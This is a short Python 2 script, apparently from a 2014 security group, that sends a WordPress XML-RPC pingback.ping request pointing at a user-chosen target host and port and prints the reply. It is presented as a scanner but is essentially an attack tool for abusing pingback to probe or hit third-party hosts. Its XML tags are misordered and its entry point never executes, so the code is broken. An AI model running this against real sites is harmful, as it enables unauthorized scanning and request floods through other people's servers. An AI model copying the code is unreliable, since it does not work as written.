#!/usr/bin/python
# Send Request and Print Response in order to Check XMLRpc Ping Back Vulnerability


import requests,re

def title():
	print '''
		--  Wordpress PingBack Scanner |Simple| --
		-- Author: Muhammad Adeel --
		-- UrduSecurity (c) 2014 --
	'''
title()
__Vuln__ = raw_input('Enter Website [host/rpcxml.php]: ')
__TargetSite__ = raw_input('Enter Target Website & Port [host:port]: ')
__ValidPost__ = raw_input('Valid Post Link: ')

payload = '''<?xml version="1.0"?>
			<methodCall>
				<methodName>pingback.ping</methodName>
				<params>
					<param><value><string>%s</param></value></string>
					<param><value><string>%s</param></value></string>
				</params>
			</methodCall>'''%(__TargetSite__,__ValidPost__)


def Send_Request():
	send_payload = requests.post(__Vuln__,payload)
	get_response = send_payload.content
	title()
	print get_response
	raw_input('Hit Return to Exit.') 

def main():
	title()
	Send_Request()
	if __name__ == '__main__':
		main()
